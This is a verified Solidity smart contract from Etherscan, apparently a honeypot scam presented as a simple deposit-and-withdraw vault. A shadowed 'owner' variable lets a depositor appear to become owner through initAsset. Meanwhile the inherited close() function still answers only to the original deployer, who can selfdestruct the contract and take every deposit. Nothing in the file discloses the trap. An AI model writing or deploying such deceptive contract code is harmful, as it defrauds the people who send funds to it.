/**
 * Source Code first verified at https://etherscan.io on Sunday, March 24, 2019
 (UTC) */

pragma solidity ^0.4.25;

contract Mew {
    address owner = msg.sender;
    function change(address a) public { if(owner==msg.sender) owner=a; }
    function close() public { if(owner==msg.sender) selfdestruct(msg.sender); }
}

contract Asset is Mew
{
    address public owner;
    mapping ( address => uint256 ) public assetIn;
    uint256 public minDeposit;
    function() external payable { }
    function initAsset(uint256 min) public payable {
        if (min > minDeposit && msg.value >= min) {
            owner = msg.sender;
            minDeposit = min;
            deposit();
        } else revert();
    }
    function deposit() public payable {
        if (msg.value >= minDeposit) {
            assetIn[msg.sender] += msg.value;
        }
    }
    function withdraw(uint256 amount) public {
        uint256 max = assetIn[msg.sender];
        if (max > 0 && amount <= max) {
            assetIn[msg.sender] -= amount;
            msg.sender.transfer(amount);
        }
    }
}